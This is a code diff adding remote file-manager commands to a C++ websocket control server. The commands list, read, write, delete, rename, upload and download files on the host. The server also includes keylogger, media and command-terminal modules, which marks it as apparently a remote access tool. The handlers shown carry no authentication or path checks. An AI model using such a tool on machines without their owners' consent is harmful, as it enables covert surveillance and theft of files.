@@ -16,6 +16,7 @@
 #include "Keylogger.h"
 #include "MediaManager.h"
 #include "CmdTerminal.h"
+#include "FileManager.h"
 
 // Tắt cảnh báo biên dịch không cần thiết
 #pragma warning(push)
@@ -369,6 +370,159 @@ void on_message(server* s, websocketpp::connection_hdl hdl, server::message_ptr 
                     j_res["running"] = false;
                 }
                 j_res["type"] = "CMD_STATUS";
+            }
+
+            // =============================================================
+            // 6. NHÓM LỆNH: FILE MANAGER
+            // =============================================================
+            else if (cmd == "LIST_DIR") {
+                std::string path = j_req["path"];
+                std::string result = ListDirectory(path);
+                j_res = json::parse(result);
+                j_res["type"] = "DIR_LIST";
+            }
+            else if (cmd == "GET_DIR_TREE") {
+                std::string path = j_req["path"];
+                std::string result = GetDirectoryStructure(path);
+                j_res = json::parse(result);
+                j_res["type"] = "DIR_TREE";
+            }
+            else if (cmd == "CREATE_FILE") {
+                std::string path = j_req["path"];
+                std::string content = j_req.contains("content") ? j_req["content"].get<std::string>() : "";
+                bool success = CreateNewFile(path, content);
+                
+                // Verify file was created and is accessible
+                if (success) {
+                    std::error_code ec;
+                    if (!fs::exists(path, ec) || ec) {
+                        success = false;
+                    } else {
+                        // Try to read it back to verify
+                        std::ifstream test(path, std::ios::binary);
+                        if (!test.is_open()) {
+                            success = false;
+                        } else {
+                            test.close();
+                        }
+                    }
+                }
+                
+                j_res["success"] = success;
+                j_res["msg"] = success ? "File created successfully" : "Failed to create file";
+                j_res["type"] = "ACTION_RESULT";
+                j_res["path"] = path;
+            }
+            else if (cmd == "CREATE_FOLDER") {
+                std::string path = j_req["path"];
+                bool success = CreateNewFolder(path);
+                j_res["success"] = success;
+                j_res["msg"] = success ? "Folder created successfully" : "Failed to create folder";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "DELETE_ITEM") {
+                std::string path = j_req["path"];
+                bool success = DeleteFileOrFolder(path);
+                j_res["success"] = success;
+                j_res["msg"] = success ? "Item deleted successfully" : "Failed to delete item";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "RENAME_ITEM") {
+                std::string oldPath = j_req["oldPath"];
+                std::string newPath = j_req["newPath"];
+                bool success = RenameFileOrFolder(oldPath, newPath);
+                j_res["success"] = success;
+                j_res["msg"] = success ? "Item renamed successfully" : "Failed to rename item";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "READ_FILE") {
+                std::string path = j_req["path"];
+                std::string content = ReadFileContent(path);
+                
+                // Check if content is valid UTF-8
+                bool isText = !content.empty() && IsValidUTF8(content);
+                
+                if (isText) {
+                    // Safe to send as text
+                    j_res["content"] = content;
+                    j_res["encoding"] = "utf8";
+                } else if (!content.empty()) {
+                    // Binary file - encode as Base64
+                    std::string base64 = ReadFileAsBase64(path);
+                    j_res["content"] = base64;
+                    j_res["encoding"] = "base64";
+                } else {
+                    // Empty file
+                    j_res["content"] = "";
+                    j_res["encoding"] = "utf8";
+                }
+                
+                j_res["success"] = !content.empty() || fs::file_size(path) == 0;
+                j_res["type"] = "FILE_CONTENT";
+            }
+            else if (cmd == "WRITE_FILE") {
+                std::string path = j_req["path"];
+                std::string content = "";
+                
+                // Check if content exists and is not null
+                if (j_req.contains("content") && !j_req["content"].is_null()) {
+                    content = j_req["content"].get<std::string>();
+                }
+                
+                bool success = WriteFileContent(path, content);
+                j_res["success"] = success;
+                j_res["msg"] = success ? "File saved successfully" : "Failed to save file";
+                j_res["type"] = "ACTION_RESULT";
+            }
+            else if (cmd == "DOWNLOAD_FILE") {
+                std::string path = j_req["path"];
+                std::string base64Data = ReadFileAsBase64(path);
+                j_res["data"] = base64Data;
+                j_res["success"] = !base64Data.empty();
+                j_res["filename"] = fs::path(path).filename().string();
+                j_res["type"] = "FILE_DOWNLOAD";
+            }
+            else if (cmd == "UPLOAD_FILE") {
+                std::string path = j_req["path"];
+                std::string base64Data = "";
+                
+                // Check if data exists and is not null
+                if (j_req.contains("data") && !j_req["data"].is_null()) {
+                    base64Data = j_req["data"].get<std::string>();
+                }
+                
+                if (base64Data.empty()) {
+                    j_res["success"] = false;
+                    j_res["msg"] = "No data provided for upload";
+                    j_res["type"] = "ACTION_RESULT";
+                } else {
+                    bool success = WriteFileFromBase64(path, base64Data);
+                    
+                    // Verify file was created and is accessible
+                    if (success) {
+                        std::error_code ec;
+                        if (!fs::exists(path, ec) || ec) {
+                            success = false;
+                        } else {
+                            // Verify file size
+                            uintmax_t size = fs::file_size(path, ec);
+                            if (ec || size == 0) {
+                                success = false;
+                            }
+                        }
+                    }
+                    
+                    j_res["success"] = success;
+                    j_res["msg"] = success ? "File uploaded successfully" : "Failed to upload file";
+                    j_res["type"] = "ACTION_RESULT";
+                    j_res["path"] = path;
+                }
+            }
+            else if (cmd == "GET_FILE_INFO") {
+                std::string path = j_req["path"];
+                std::string result = GetFileInfo(path);
+                j_res = json::parse(result);
+                j_res["type"] = "FILE_INFO";
             }
 
             // =============================================================
